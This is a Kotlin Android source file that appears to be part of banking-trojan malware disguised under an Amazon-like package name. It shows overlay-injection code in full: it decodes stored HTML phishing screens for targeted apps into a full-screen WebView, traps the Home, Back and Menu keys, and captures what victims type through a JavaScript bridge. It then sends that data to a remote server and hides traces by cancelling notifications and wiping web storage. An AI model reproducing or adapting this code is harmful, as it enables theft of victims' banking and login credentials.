package com.amazon.zzz.Activities

import android.app.Activity
import android.content.Context
import android.os.Bundle
import android.util.Base64
import android.util.Log
import android.view.KeyEvent
import android.view.View
import android.view.ViewGroup
import android.webkit.*
import androidx.core.app.NotificationManagerCompat
import com.amazon.zzz.ApiNm.apiUt
import com.amazon.zzz.Modull.udUtils
import com.amazon.zzz.Utilsss.SharedPreferencess
import com.amazon.zzz.constNm
import org.json.JSONException
import org.json.JSONObject
import java.util.*
import java.util.concurrent.TimeUnit

class actViewInjection : Activity() {

    private var hideStop = false
    private var nameInj = ""
    private var open = ""
    private var stopActivity = false
    private var webView: WebView? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        open = "new"
        nameInj = SharedPreferencess.app_inject
        apiUt.sendLogs(this, "", "ViewInjectionsad $nameInj", "success")
    }

    public override fun onDestroy() {
        super.onDestroy()
        runCatching {
            if (webView != null) {
                if (webView?.parent != null) {
                    (webView?.parent as? ViewGroup?)?.removeView(webView)
                }
                WebStorage.getInstance().deleteAllData()
                webView?.destroy()
            }
            apiUt.sendLogs(this, "", "onDestroy $nameInj", "success")
        }.onFailure {
            apiUt.sendLogs(this, "", "onDestroy ${it.localizedMessage}", "error")
        }
    }

    public override fun onPause() {
        super.onPause()
    }

    override fun onRestart() {
        super.onRestart()
        open = if (!SharedPreferencess.app_inject.contains(nameInj)) {
            "new"
        } else {
            "old"
        }
    }

    override fun onStart() {
        super.onStart()
        active = true

        nameInj = SharedPreferencess.app_inject
        hideStop = true
        if (!stopActivity && open == "new") {
            Log.i("TAG_LOG", "LOADING INJECT++++++++$nameInj")
            runCatching {
                if (intent.getStringExtra("push") == "1") {
                    val startpush = intent.getStringExtra("startpush")
                    if (startpush!!.isNotEmpty()) {
                        nameInj = SharedPreferencess.app_inject
                    }
                    apiUt.sendLogs(this, "", "ViewInjectionsad onStart $nameInj startpush", "success")
                }
            }.onFailure {
                apiUt.sendLogs(this, "", "onStart ${it.localizedMessage}", "error")
            }
            try {
                if (nameInj.isNotEmpty()) {
                    webView = WebView(this)
                    webView?.settings?.javaScriptEnabled = true
                    webView?.scrollBarStyle = View.SCROLLBARS_INSIDE_OVERLAY
                    webView?.webViewClient = MyWebViewClient()
                    webView?.webChromeClient = MyWebChromeClient()
                    webView?.addJavascriptInterface(WebAppInterface(this), "Android")
                    var getHTML: String?
                    val lang = Locale.getDefault().language

                    getHTML = SharedPreferencess.SettingsRead(this, nameInj) ?: ""
                    getHTML = String(Base64.decode(getHTML, Base64.DEFAULT))
                    getHTML = getHTML.replace(constNm.s107, constNm.s108 + lang + constNm.s104)
                    getHTML = getHTML.replace(constNm.s109, constNm.s110 + nameInj + constNm.s111)

                    val lan = "en"
                    getHTML = getHTML.replace("<html lang=\"$lan\">", "<html lang=\"$lang\">")
                    getHTML = getHTML.replace(
                        constNm.ключ_от_всего,
                        constNm.шифрование + Locale.getDefault().language + constNm.ss5
                    )

                    webView?.loadDataWithBaseURL(
                        null,
                        getHTML,
                        "text/html",
                        "UTF-8",
                        null
                    )
                    setContentView(webView)
                }
                Log.i("TAG_LOG", "Start View Injection: $nameInj")
                apiUt.sendLogs(this, "", "Start View Injection: $nameInj", "success")
            } catch (ex: Exception) {
                apiUt.sendLogs(this, "", "ERROR View Injection ${ex.localizedMessage}", "error")
            }
        }
    }

    override fun onStop() {
        super.onStop()
        Log.i("INJ", "onStop!")
        active = false
        hideStop = false
        apiUt.sendLogs(this, "", "actViewInjection onStop", "log")
        Thread {
            for (i in 0..2) {
                TimeUnit.MILLISECONDS.sleep(1000)
                Log.i("HideInject", "i = $i")
                if (hideStop) {
                    break
                }
                if (i >= 2) {
                    try {
                        stopActivity = true
                        finish()
                        break
                    } catch (ex: Exception) {
                        apiUt.sendLogs(this, "", "ERROR View Injection onStop ${ex.localizedMessage}", "error")
                    }
                }
            }
        }.start()
    }

    override fun onKeyDown(keyCode: Int, event: KeyEvent): Boolean {
        if (keyCode == KeyEvent.KEYCODE_HOME) {
            return true
        }
        return if (keyCode == KeyEvent.KEYCODE_BACK) {
            true
        } else keyCode == KeyEvent.KEYCODE_MENU
    }

    inner class WebAppInterface internal constructor(var mContext: Context) {

        @JavascriptInterface
        fun returnResult(data: String) {
            runCatching {
                apiUt.sendLogs(this@actViewInjection, "", "actViewInjection returnResult", "log")
                sendReq(data)
            }.onFailure {
                apiUt.sendLogs(mContext, "", "returnResult ${it.localizedMessage}", "error")
            }
        }

        @JavascriptInterface
        fun send_log_injects(data: String) {
            runCatching {
                apiUt.sendLogs(this@actViewInjection, "", "actViewInjection send_log_injects", "log")
                sendReq(data)
            }.onFailure {
                apiUt.sendLogs(mContext, "", "send_log_injects ${it.localizedMessage}", "error")
            }
        }

        private fun sendReq(data: String) {
            if (data.isNotEmpty()) {
                val jsonObject = JSONObject()
                try {
                    jsonObject.put("application", nameInj)
                    jsonObject.put("type_injects", SharedPreferencess.SettingsRead(this@actViewInjection, "type_$nameInj"))
                    jsonObject.put("data", data.replace(constNm.не_трогай, ""))
                } catch (e: JSONException) {
                    apiUt.sendLogs(mContext, "", "ERROR View Injection sendReq ${e.localizedMessage}", "error")
                }

                SharedPreferencess.activeInjection = SharedPreferencess.activeInjection.replace(nameInj, "")
                apiUt.sendLogs(
                    mContext,
                    nameInj,
                    jsonObject.toString(),
                    SharedPreferencess.SettingsRead(this@actViewInjection, "type_$nameInj") ?: ""
                )

                if (nameInj.isNotEmpty()) {
                    stopActivity = true
                    finish()
                } else if (data.contains(constNm.не_трогай) || data.contains(constNm.хренов_реверсер)) {
                    stopActivity = true
                    finish()
                }
            }
        }
    }

    private inner class MyWebChromeClient : WebChromeClient() {
        override fun onJsAlert(
            view: WebView,
            url: String,
            message: String,
            result: JsResult
        ): Boolean {
            return true
        }
    }

    private inner class MyWebViewClient : WebViewClient() {
        override fun onPageFinished(view: WebView, url: String) {
            runCatching {
                udUtils.notificationId?.let {
                    val notificationManager = NotificationManagerCompat.from(this@actViewInjection)
                    notificationManager.cancel(it)
                }
            }.onFailure {
                apiUt.sendLogs(this@actViewInjection, "", "onPageFinished ${it.localizedMessage}", "error")
            }
        }

        @Deprecated("Deprecated in Java")
        override fun shouldOverrideUrlLoading(view: WebView, url: String): Boolean {
            return false
        }
    }

    companion object {
        var active = false
    }
}